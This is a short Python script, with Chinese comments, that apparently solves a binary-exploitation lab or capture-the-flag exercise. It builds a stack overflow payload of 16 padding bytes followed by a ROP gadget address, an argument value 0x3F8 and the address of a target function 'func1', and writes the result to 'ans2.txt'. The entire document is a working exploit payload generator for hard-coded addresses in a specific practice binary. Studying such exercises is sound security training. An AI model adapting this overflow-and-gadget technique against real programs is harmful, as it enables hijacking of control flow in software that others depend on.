import struct
padding_len = 16 # buffer+ebp

gadget_addr = 0x4012c7
right_addr = 0x3F8
# func1 函数的起始地址
target_addr = 0x401216

padding = b'A' * padding_len
payload = padding
payload+=struct.pack("<Q", gadget_addr)
payload+=struct.pack("<Q", right_addr)
payload+=struct.pack("<Q", target_addr)

with open("ans2.txt", "wb") as f:
    f.write(payload)

print(f"[*] Payload 生成完毕，跳转目标: {hex(target_addr)}")
